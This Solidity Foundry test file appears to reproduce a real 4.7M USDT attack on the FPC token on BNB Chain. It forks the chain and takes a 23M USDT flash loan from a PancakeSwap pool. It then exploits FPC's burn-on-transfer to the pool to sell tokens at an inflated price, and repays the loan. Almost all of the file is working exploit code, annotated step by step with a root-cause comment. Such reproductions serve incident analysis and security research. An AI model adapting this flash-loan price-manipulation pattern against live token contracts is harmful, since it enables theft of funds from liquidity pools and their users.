// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 4.7M USDT
// Attacker : https://bscscan.com/address/0x18dd258631b23777c101440380bf053c79db3d9d
// Attack Contract : https://bscscan.com/address/0xbf6e706d505e81ad1f73bbc0babfe2b414ba3eb3
// Vulnerable Contract : https://bscscan.com/address/0xb192d4a737430aa61cea4ce9bfb6432f7d42592f
// Attack Tx : https://bscscan.com/tx/0x3a9dd216fb6314c013fa8c4f85bfbbe0ed0a73209f54c57c1aab02ba989f5937

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xb192d4a737430aa61cea4ce9bfb6432f7d42592f#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1940423393880244327
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant USDT_ADDR = 0x55d398326f99059fF775485246999027B3197955;
address constant PANCAKE_POOL = 0x92b7807bF19b7DDdf89b706143896d05228f3121;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant PANCAKE_PAIR = 0xa1e08E10Eb09857A8C6F2Ef6CCA297c1a081eD6B;
address constant FPC_ADDR = 0xB192D4A737430AA61CEA4Ce9bFb6432f7D42592F;

contract FPC is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 52624701 - 1;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = USDT_ADDR;
    }

    function testExploit() public balanceLog {
        // Step 1: borrow 23,020,000 USDT from Pancake Pool
        IPancakeV3Pool(PANCAKE_POOL).flash(address(this), 23_020_000 ether, 0, "");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public {
        uint256 amountIn = 23_019_990 ether;
        address[] memory path = new address[](2);
        path[0] = USDT_ADDR;
        path[1] = FPC_ADDR;
        IPancakeRouter router = IPancakeRouter(payable(PANCAKE_ROUTER));
        uint256[] memory amounts = router.getAmountsOut(amountIn, path);
        // Step 2: USDT -> FPC
        IPancakePair(PANCAKE_PAIR).swap(1 ether, amounts[1], address(this), hex"00");

        IERC20 fpc = IERC20(FPC_ADDR);
        // Step 4: create a helper contract to convert 247,441 FPC to USDT
        Helper helper = new Helper();
        fpc.transfer(address(helper), 247_441_170_766_403_071_054_109);
        helper.swap(PANCAKE_ROUTER, FPC_ADDR);

        // Step 6: pay back the loan
        IERC20(USDT_ADDR).transfer(PANCAKE_POOL, 23_020_000 ether + fee0);
    }

    // Step 3: transfer USDT to CAKE LP
    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) public {
        IERC20 usdt = IERC20(USDT_ADDR);
        usdt.transfer(PANCAKE_PAIR, usdt.balanceOf(address(this)));
    }
}

contract Helper {
    function swap(address routerAddr, address fpcAddr) public {
        IERC20 fpc = IERC20(fpcAddr);
        fpc.approve(routerAddr, type(uint256).max);

        uint256 balance = fpc.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = FPC_ADDR;
        path[1] = USDT_ADDR;
        // Root cause: FPC burns tokens on transfers to the pool.
        // Impact: attacker can sell FPC at an inflated price.
        // Step 5: FPC -> USDT
        IPancakeRouter(payable(routerAddr)).swapExactTokensForTokensSupportingFeeOnTransferTokens(balance, 0, path, msg.sender, block.timestamp);
    }
}